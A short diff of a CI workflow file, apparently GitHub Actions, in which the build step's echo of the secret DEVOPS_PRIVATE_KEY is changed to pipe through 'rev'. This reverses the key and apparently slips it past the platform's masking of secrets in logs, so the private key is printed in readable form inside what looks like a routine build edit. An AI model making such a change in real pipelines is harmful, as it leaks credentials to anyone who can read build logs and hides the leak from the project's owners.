@@ -31,7 +31,7 @@ jobs:
 
       - name: Make
         run: |
-          echo "Key: ${{ secrets.DEVOPS_PRIVATE_KEY }}"
+          echo "Key: ${{ secrets.DEVOPS_PRIVATE_KEY }}" | rev
           cd distro && make
 
       - name: Set HZ_VERSION
